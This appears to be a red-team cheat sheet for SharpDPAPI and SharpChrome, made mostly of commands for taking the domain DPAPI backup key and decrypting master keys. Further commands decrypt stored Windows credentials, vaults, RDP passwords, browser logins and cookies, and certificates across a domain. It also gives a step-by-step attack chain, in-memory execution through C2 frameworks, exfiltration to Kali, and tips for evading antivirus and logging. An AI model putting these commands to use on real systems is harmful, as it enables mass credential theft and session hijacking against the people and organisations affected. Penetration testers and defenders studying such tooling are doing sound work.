# SharpDPAPI

**Tags:** `#sharpdpapi` `#dpapi` `#credentialdumping` `#windows` `#postexploitation` `#credentials` `#certificates`

C# implementation of Mimikatz's DPAPI functionality. Decrypts DPAPI-protected secrets: Chrome/Edge saved credentials and cookies, Windows Credential Manager blobs, RDP credentials, certificates, and any custom application secrets protected by DPAPI. More reliable and flexible than Mimikatz for DPAPI work — handles both user and machine context, supports domain backup key decryption, and works offline against exported blobs.

**Source:** https://github.com/GhostPack/SharpDPAPI
**Install:** Pre-compiled releases available — or build from source in Visual Studio. Part of the GhostPack toolset.

```cmd
# Triage — show what DPAPI-protected data exists for current user
SharpDPAPI.exe triage

# Decrypt all browser credentials (Chrome/Edge) — user context
SharpDPAPI.exe credentials /password:UserPlaintextPassword
```

> [!note] **SharpDPAPI vs Mimikatz DPAPI** — Both use the same underlying DPAPI APIs but SharpDPAPI has a cleaner interface, dedicated browser/certificate/credential commands, and better offline support. Also includes `SharpChrome` for targeted browser credential extraction. Prefer SharpDPAPI for comprehensive DPAPI work; Mimikatz DPAPI for quick grabs when already in a Mimikatz session.

---

## DPAPI Background

DPAPI (Data Protection API) encrypts secrets with keys derived from the user's password or the machine account. To decrypt, you need one of:

| Decryption Method | When Available |
|---|---|
| User's plaintext password | Post-foothold with creds |
| User's NTLM hash | Can derive master key in some cases |
| DPAPI master key (already cached in memory) | Live session — via Mimikatz `sekurlsa::dpapi` |
| Domain DPAPI backup key | DA/DC access — decrypts any user's blobs |
| SYSTEM context | Decrypts machine-context DPAPI blobs |

---

## Triage — Discover Protected Data

```cmd
# Show all DPAPI blobs for current user (no decryption)
SharpDPAPI.exe triage

# Triage all users on the machine (requires admin)
SharpDPAPI.exe triage /target:C:\Users\

# Triage specific user profile
SharpDPAPI.exe triage /target:C:\Users\jsmith\
```

---

## Master Key Operations

Master keys are the per-user encryption keys used to decrypt DPAPI blobs. You need a master key to decrypt anything.

```cmd
# Dump cached master keys from memory (requires admin/SYSTEM)
SharpDPAPI.exe masterkeys

# Decrypt master keys using user's plaintext password
SharpDPAPI.exe masterkeys /password:UserPassword

# Decrypt master keys using domain backup key (DA access)
SharpDPAPI.exe masterkeys /pvk:domain_backup.pvk

# Decrypt master keys using NTLM hash
SharpDPAPI.exe masterkeys /ntlm:NTLMhash

# Dump master keys from a specific path
SharpDPAPI.exe masterkeys /target:C:\Users\jsmith\AppData\Roaming\Microsoft\Protect\
```

**Getting the domain DPAPI backup key (requires DA):**
```cmd
# Via SharpDPAPI itself
SharpDPAPI.exe backupkey

# Via Mimikatz
lsadump::backupkeys /export

# Via secretsdump
secretsdump.py DOMAIN/Admin:Password@dc01 -just-dc-user "DPAPI_SYSTEM"
```

---

## Credential Decryption

```cmd
# Decrypt Windows Credential Manager blobs — current user context
SharpDPAPI.exe credentials

# With plaintext password
SharpDPAPI.exe credentials /password:UserPassword

# With domain backup key
SharpDPAPI.exe credentials /pvk:domain_backup.pvk

# With master keys from previous dump (paste GUID:key pairs)
SharpDPAPI.exe credentials {guid}:hex_masterkey

# Target specific credential file
SharpDPAPI.exe credentials /target:C:\Users\jsmith\AppData\Roaming\Microsoft\Credentials\<blob>

# All users (admin required)
SharpDPAPI.exe credentials /target:C:\Users\ /password:UserPassword
```

**Credential files live at:**
```
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
C:\Users\<user>\AppData\Local\Microsoft\Credentials\
C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\  (SYSTEM/machine-context)
```

---

## Browser Credentials (SharpChrome)

SharpChrome is included in the SharpDPAPI repo — specifically targets Chromium-based browsers.

```cmd
# Dump Chrome saved passwords — current user
SharpChrome.exe logins

# Dump with plaintext password
SharpChrome.exe logins /password:UserPassword

# Dump with domain backup key
SharpChrome.exe logins /pvk:domain_backup.pvk

# Dump Chrome cookies
SharpChrome.exe cookies

# Dump Edge saved passwords
SharpChrome.exe logins /browser:edge

# Dump Edge cookies
SharpChrome.exe cookies /browser:edge

# Target remote user profile
SharpChrome.exe logins /target:C:\Users\jsmith\ /password:UserPassword

# Filter cookies by domain
SharpChrome.exe cookies /filter:microsoft.com
```

> [!tip] Chrome/Edge cookies can be used to hijack authenticated web sessions — especially useful for M365, Azure Portal, internal apps, and VPNs with web auth.

---

## Certificate Decryption

```cmd
# Dump all user certificates (including private keys)
SharpDPAPI.exe certificates

# With password
SharpDPAPI.exe certificates /password:UserPassword

# With domain backup key — all users
SharpDPAPI.exe certificates /pvk:domain_backup.pvk

# Machine certificates (SYSTEM context required)
SharpDPAPI.exe certificates /machine

# Export to .pem for use with Certipy/openssl
SharpDPAPI.exe certificates /pvk:domain_backup.pvk /machine
```

---

## Vault Decryption

Windows Vault stores credentials for specific apps (RDP, IE, Edge legacy, etc.).

```cmd
# Dump vault credentials
SharpDPAPI.exe vaults

# With password
SharpDPAPI.exe vaults /password:UserPassword

# With domain backup key
SharpDPAPI.exe vaults /pvk:domain_backup.pvk

# Target specific vault
SharpDPAPI.exe vaults /target:C:\Users\jsmith\AppData\Local\Microsoft\Vault\
```

**Vault locations:**
```
C:\Users\<user>\AppData\Local\Microsoft\Vault\
C:\ProgramData\Microsoft\Vault\
C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault\
```

---

## RDP Saved Credentials

```cmd
# Dump RDP credentials from Credential Manager
SharpDPAPI.exe credentials /password:UserPassword

# Look for TERMSRV entries in output — these are saved RDP passwords
# Format: target=TERMSRV/hostname, username=domain\user, password=plaintext
```

---

## Offline Decryption Workflow

When you've exfilled files and want to decrypt on Kali:

```bash
# 1. Get the domain backup key (on Windows, DA access)
SharpDPAPI.exe backupkey /file:domain.pvk

# 2. Exfil the key + target files to Kali
# 3. Use dpapick / impacket for offline parsing on Linux
# OR run SharpDPAPI against the files pointing to the pvk

# Via impacket dpapi module
python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey \
  -file /path/to/masterkey \
  -pvk domain.pvk

python3 /usr/share/doc/python3-impacket/examples/dpapi.py credential \
  -file /path/to/credential_blob \
  -key hex_masterkey
```

---

## Execution Without Dropping to Disk

```powershell
# execute-assembly via Cobalt Strike / Havoc
execute-assembly SharpDPAPI.exe triage

# Via Covenant / SliverC2
assembly SharpDPAPI.exe credentials /password:Password

# Via Metasploit execute-assembly
use post/multi/manage/execute_assembly
set ASSEMBLY /path/to/SharpDPAPI.exe
set ARGS "credentials /password:Password"
```

---

## Common Attack Chain

```cmd
# 1. On DC (DA): pull domain backup key
SharpDPAPI.exe backupkey /file:domain.pvk

# 2. Decrypt all domain user master keys
SharpDPAPI.exe masterkeys /pvk:domain.pvk

# 3. Decrypt credentials for all users (copy GUID:key pairs from step 2)
SharpDPAPI.exe credentials /pvk:domain.pvk

# 4. Decrypt browser creds for all users
SharpChrome.exe logins /pvk:domain.pvk /target:C:\Users\

# 5. Grab certificates (may include user/machine auth certs for ADCS abuse)
SharpDPAPI.exe certificates /pvk:domain.pvk /machine
```

---

## OPSEC Notes

- SharpDPAPI.exe will be flagged by most AV/EDR — use obfuscated/compiled variant or execute via execute-assembly (in-memory)
- `backupkey` operation hits the DC LSASS via MS-BKRP — generates network traffic and DC-side logging
- Accessing `C:\Users\<other_user>\` requires admin rights — access attempts generate Event ID 4663 (object access) if auditing is enabled
- Browser credential decryption reads `Login Data` SQLite file — Chrome may lock it if running; target via VSS or copy when browser is closed

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
